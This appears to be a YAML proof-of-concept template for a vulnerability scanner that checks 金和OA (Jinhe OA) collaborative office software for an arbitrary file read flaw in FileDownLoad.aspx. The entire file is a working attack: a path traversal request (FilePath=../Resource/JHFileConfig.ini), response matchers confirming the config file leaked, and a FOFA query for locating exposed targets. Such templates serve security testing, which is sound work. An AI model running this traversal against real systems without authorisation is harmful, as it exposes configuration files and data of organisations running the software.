id: poc-yaml-jinhe-oa-filedownload-aspx-anyfile-read
info:
  name: 金和OA FileDownLoad.aspx 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 金和OA 协同办公管理系统
  fofa: app="金和网络-金和OA"
requests:
- method: GET
  path: /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini
  expression: 'status_code == 200 &&

    contains(body,"[JHFile]") &&

    contains(body,"FolderTotal=") &&

    contains(headers,"filename=JHFileConfig.ini")

    '
variables: {}
transport: http
